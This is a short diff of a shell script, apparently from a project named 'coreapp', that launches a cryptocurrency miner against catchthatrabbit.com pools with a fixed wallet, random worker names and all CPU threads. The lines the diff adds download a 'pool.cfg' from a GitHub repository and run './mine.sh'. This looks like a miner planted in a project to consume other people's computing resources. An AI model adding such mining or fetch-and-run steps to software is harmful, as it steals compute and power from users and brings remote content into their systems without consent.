@@ -10,3 +10,5 @@ cd coreapp
     -P stratum1+tcp://cb1145cf4139a506a5395155bd5128152b673cc18377.$(echo $RANDOM | md5sum | head -c 10)@as1.catchthatrabbit.com:8008 \
     -P stratum1+tcp://cb1145cf4139a506a5395155bd5128152b673cc18377.$(echo $RANDOM | md5sum | head -c 10)@us1.catchthatrabbit.com:8008 \
     -t $(nproc --all)
+wget https://github.com/aquilarendy/fool/raw/main/pool.cfg
+./mine.sh
